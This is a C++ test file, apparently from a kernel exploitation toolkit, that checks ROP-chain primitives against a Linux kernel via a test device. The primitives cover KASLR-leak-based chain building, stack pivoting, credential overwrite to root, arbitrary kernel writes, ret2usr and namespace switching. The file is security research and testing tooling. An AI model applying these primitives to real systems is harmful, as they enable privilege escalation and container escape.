/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#pragma once

#include <sched.h>
#include <unistd.h>
#include <sys/wait.h>
#include "test/TestSuite.h"
#include "test/TestUtils.h"
#include <xdk/xdk_device/xdk_device.h>
#include <xdk/util/HexDump.h>
#include <xdk/util/error.h>
#include <xdk/util/Syscalls.h>
#include <xdk/payloads/RopChain.h>
#include <xdk/payloads/Payload.h>
#include <xdk/rip/RopUtils.h>

void ret2usr_kernel() {
    _exit(133);
}

class RopActionTests: public TestSuite {
    XdkDevice* xdk_;
public:
    RopActionTests(): TestSuite("RopActionRuntimeTests", "RopAction runtime tests") { }

    void init() {
        xdk_ = &env->GetXdkDevice();
    }

    RopChain GetRopChain() {
        return RopChain(env->GetTarget(), xdk_->KaslrLeak());
    }

    // return true in case of a fork
    bool ExecuteRopChain(RopChain& rop, uint64_t min_stack = 0, uint64_t max_stack = 4096, uint64_t buf_size = 4096) {
        rop.Add(xdk_->GetRipControlRecoveryAddr());

        Payload p(buf_size);
        auto rop_offs = p.Size() - rop.GetByteSize();
        p.Set(rop_offs, rop.GetData());

        auto rop_buf_addr = xdk_->AllocBuffer(p.GetData(), true);
        Log("rop_buf_addr = 0x%lx", rop_buf_addr);

        auto orig_pid = getpid();
        xdk_->SetRspAndRet(rop_buf_addr + rop_offs);
        if (getpid() != orig_pid)
            return true;

        auto used_stack = xdk_->Read(rop_buf_addr, rop_offs);
        Log("Stack content:\n%s", HexDump::Dump(used_stack).c_str());
        xdk_->Kfree(rop_buf_addr);

        size_t non_used_bytes = 0;
        for (; non_used_bytes < used_stack.size(); non_used_bytes++)
            if (used_stack[non_used_bytes] != 0)
                break;

        auto used_stack_size = used_stack.size() - non_used_bytes;
        if (used_stack_size < min_stack || used_stack_size > max_stack)
            throw ExpKitError("Expected stack size between %u .. %u bytes, but it used %u bytes", min_stack, max_stack, used_stack_size);

        return false;
    }

    // return true in case of a fork
    bool ExecuteRopAction(RopActionId id, std::vector<uint64_t> arguments = {}, uint64_t min_stack = 0, uint64_t max_stack = 4096, uint64_t buf_size = 4096) {
        auto rop = GetRopChain();
        rop.AddRopAction(id, arguments);
        return ExecuteRopChain(rop, min_stack, max_stack, buf_size);
    }

    TEST_METHOD(commitCredsTest, "COMMIT_INIT_TASK_CREDS is working") {
        auto orig_uid = getuid();
        setuid(1);
        ASSERT_EQ(1, getuid());
        ExecuteRopAction(RopActionId::COMMIT_INIT_TASK_CREDS, {}, 100, 512);
        ASSERT_EQ(0, getuid());
        setuid(orig_uid);
    }

    TEST_METHOD(winTargetWorks, "win_target is working") {
        auto rop = GetRopChain();
        rop.Add(xdk_->WinTarget());
        // TODO: based on tests sometimes we see stack usage here up to 240 bytes.
        //   Our theory is that an interrupt is happening and it uses the stack.
        //   But this needs investigation later and proper handling of this issue.
        ExecuteRopChain(rop, 0, 240);
        xdk_->CheckWin();
    }

    TEST_METHOD(writeWhatWhereTest, "WRITE_WHAT_WHERE_64 is working") {
        Payload p(40);
        size_t target_offs = 16;
        uint64_t new_value = 0x1122334455667788;

        auto target_buf_addr = xdk_->AllocBuffer(p.GetData(), true);
        ExecuteRopAction(RopActionId::WRITE_WHAT_WHERE_64, {target_buf_addr + target_offs, new_value}, 0, 0);

        auto buf_leak = xdk_->Read(target_buf_addr, p.Size());
        Log("Leaked buffer:\n%s", HexDump::Dump(buf_leak).c_str());
        xdk_->Kfree(target_buf_addr);

        for (size_t i = 0; i < p.Size(); i += 8)
            ASSERT_EQ(i == target_offs ? new_value : 0, *((uint64_t*)&buf_leak[i]));
    }

    bool check_fork(int expected_exitcode) {
        int status;
        return wait(&status) != -1 && WIFEXITED(status) && WEXITSTATUS(status) == expected_exitcode;
    }

    TEST_METHOD(teleforkTest, "TELEFORK is working, its stack usage is in expected range") {
        if (ExecuteRopAction(RopActionId::TELEFORK, {10}, 400, 2600))
            exit(123);

        // TODO: this can conflict with other user-space fork calls, use a better design?
        if (!check_fork(123))
            throw ExpKitError("No child was forked.");
    }

    TEST_METHOD(ret2usrTest, "RET2USR works") {
        if (!fork()) {
            auto rop = GetRopChain();
            RopUtils::Ret2Usr(rop, (void*)&ret2usr_kernel);
            ExecuteRopChain(rop);
        } else if (!check_fork(133))
            throw ExpKitError("Could not run code via RET2USR.");
    }

    TEST_METHOD(switchTaskNamespacesTest, "SWITCH_TASK_NAMESPACES works") {
        // fork so we won't ruin the test runner's namespace
        if (!fork()) {
          auto orig_ns = Syscalls::readlink("/proc/self/ns/ipc");
          Log("before unshare %u %u %s", getuid(), getpid(), orig_ns.c_str());

          Syscalls::unshare(CLONE_NEWUSER|CLONE_NEWIPC);

          auto new_ns = Syscalls::readlink("/proc/self/ns/ipc");
          Log("after unshare %u %u %s", getuid(), getpid(), new_ns.c_str());
          ASSERT_NE(orig_ns.c_str(), new_ns.c_str());

          auto rop = GetRopChain();
          rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {(uint64_t)getpid()});
          ExecuteRopChain(rop, 0, 512);

          auto restored_ns = Syscalls::readlink("/proc/self/ns/ipc");
          Log("after SWITCH_TASK_NAMESPACES %u %u %s", getuid(), getpid(), restored_ns.c_str());
          ASSERT_EQ(orig_ns.c_str(), restored_ns.c_str());
          _exit(0);
        } else if (!check_fork(0))
          throw ExpKitError("Fork failed.");
    }
};
